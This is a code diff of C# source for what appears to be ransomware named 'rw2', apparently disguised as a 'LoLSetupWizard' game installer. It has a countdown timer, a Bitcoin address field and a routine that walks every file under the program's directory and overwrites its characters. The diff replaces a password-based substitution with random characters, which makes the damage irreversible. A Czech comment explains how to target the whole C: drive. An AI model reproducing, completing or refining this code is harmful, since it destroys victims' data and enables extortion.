@@ -15,15 +15,15 @@ using System.Security.AccessControl;
 
 namespace rw2
 {
-    
     public partial class Form1 : Form
     {
         public int minutes = 10, seconds = 0, milisec = 0;
+        Random rnd = new Random();
         public Form1()
         {
             InitializeComponent();
         }
-        string alphabet = "abcdefghijklmnopqrstuvwxyz";
+        string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
         string btcAddress;
         public string getRandomString(int minLength, int maxLength)
         {
@@ -38,17 +38,11 @@ namespace rw2
         }
         public char getCryptedCharacter(string password, char givenChar)
         {
-            int vys = 0;
             if(givenChar == '.')
             {
                 return givenChar;
             }
-            foreach(char character in password)
-            {
-                vys += (character * givenChar);
-            }
-            vys %= 25;
-            return alphabet[vys];
+            return alphabet[rnd.Next(0,alphabet.Length)];
         }
         public string getCryptedString(string password, string str)
         {
@@ -69,14 +63,14 @@ namespace rw2
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
             //Pokud chces sifrovat cely disk tak vymen filePath za "C:"
+            
+            filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
+            filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
             //a pridej
             //filePathsBefore.RemoveAll(x => x.Contains(".exe");
             //filePathsBefore.RemoveAll(x => x.Contains(".sys");
             //filePathsBefore.RemoveAll(x => x.Contains(".dll");
             //tyhle soubory jsou vetsinou dulezite na chod pocitace
-            filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
-            filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
-            
             foreach (string file in filePathsBefore)
             {
                 if (file.Contains(@"\")) 
